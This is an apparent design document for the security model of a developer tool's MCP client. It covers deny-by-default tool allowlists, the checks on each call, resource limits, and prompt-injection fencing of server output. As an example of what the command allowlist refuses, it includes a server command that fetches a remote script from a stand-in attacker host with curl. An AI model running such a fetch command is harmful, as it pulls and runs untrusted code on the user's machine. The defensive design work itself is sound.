# MCP security model

An MCP server is a third-party program DevForge **starts as a child process** and then
**takes instructions from**. Both halves matter: it is untrusted code *and* an untrusted
source of text that ends up in front of a model holding tool permissions.

Nothing is trusted because it is configured.

## What is implemented

`devforge/mcp/` contains a direct JSON-RPC client — no new dependency, since MCP over
stdio is newline-delimited JSON on a subprocess's pipes.

| Piece | Status |
| --- | --- |
| stdio transport | implemented |
| HTTP / SSE transports | **not implemented** — a server configured with one is refused, not downgraded |
| `initialize`, `tools/list`, `tools/call` | implemented |
| resources, prompts, notifications | not implemented |
| **sampling** | **deliberately not implemented** — it lets a server drive the model, which inverts the trust relationship |

## Configuration

`.devforge/mcp.yaml`, scaffolded empty by `devforge init`:

```yaml
version: 1
servers:
  - name: filesystem
    command: [npx, -y, "@modelcontextprotocol/server-filesystem", "./src"]
    transport: stdio
    enabled: false            # disabled until you say otherwise
    trust: untrusted          # untrusted | reviewed
    allow_tools: []           # deny-by-default: name each tool you actually want
    timeout_s: 30
    allow_env: []             # extra environment variables this server may inherit
    risk: read
```

## The gauntlet a call runs

```
mcp.call(server, tool, arguments)
  ├─ server exists in .devforge/mcp.yaml?      no → denied
  ├─ server enabled?                            no → denied
  ├─ transport implemented?                     no → unavailable
  ├─ tool named in allow_tools?                 no → denied
  ├─ launch command passes the shell allowlist? no → denied / approval gate
  ├─ arguments valid against the server schema? no → error
  ├─ execute: timeout, sanitised env, size caps
  ├─ response treated as untrusted: bounded, scanned, fenced
  └─ audit event either way
```

Four properties are worth stating on their own:

**Starting a server is a subprocess spawn.** Its `command` goes through
`permissions.yaml` like anything else. A server configured as
`command: [curl, https://evil.test/server.sh]` is refused before it runs — MCP is not a
side door around the command allowlist.

**Tools are denied until named.** A server that grows a new tool overnight cannot use
it. `devforge` reports such tools as `[NOT approved]` during discovery rather than
quietly gaining a capability.

**The server is started per call and stopped after.** Slower than a connection pool,
and much easier to reason about: no long-lived third-party process outlives the
operation that needed it. Shutdown is bounded — pipes are drained and the wait is
time-boxed, because a hostile server that blocks on a full pipe must not be able to
hang the harness during cleanup.

**Responses are data, never instructions.** Text comes back through
`devforge.tools.untrusted`: size-bounded, scanned for injection shapes, and wrapped in a
labelled fence that states its contents are untrusted. Non-text blocks (images, binary)
are *named, not inlined* — a base64 payload in a prompt is an opaque channel the
inspector cannot review.

## Resource limits

| Limit | Value | Why |
| --- | --- | --- |
| Single frame | 4 MB | A hostile server cannot exhaust memory with one line |
| Session output | 32 MB | Nor by streaming many |
| Request timeout | per-server, default 30 s | A silent server cannot stall a run |
| Shutdown | 2 s drain + 5 s wait | Cleanup cannot hang either |
| Response text into a prompt | 40 000 chars | Bounded context, truncation visible |

## What this does not protect against

- **A reviewed server that turns malicious.** `trust: reviewed` records a human
  judgement at a point in time; there is no re-verification and no content pinning for
  MCP servers (unlike skills, which are pinned by content hash).
- **A server that is honest but wrong.** Schema validation checks a JSON Schema
  *subset* — `type`, `required`, `enum`, `items`, `maxLength`. Unknown keywords are
  ignored, not assumed satisfied.
- **Prompt injection in server output.** Fencing and scanning raise the cost; a
  paraphrase no pattern matches still reaches the model. The controls that do not depend
  on the model behaving are the filesystem deny rules, the command allowlist and the
  approval gates.
- **Anything the server does to the rest of your machine.** It runs as you, with a
  sanitised environment but no sandbox. This is the same limitation the rest of DevForge
  documents.

## Operating advice

1. Start with `enabled: false` and read the server's source.
2. Enable it, run `mcp.list_tools`, and read what it exposes.
3. Add tools to `allow_tools` **one at a time**, each because you want it.
4. Keep `allow_env: []` unless a server genuinely needs a variable, and never give it a
   credential you would not paste into a public issue.
5. Prefer servers that read over servers that write, and never mark a server `reviewed`
   because it worked.
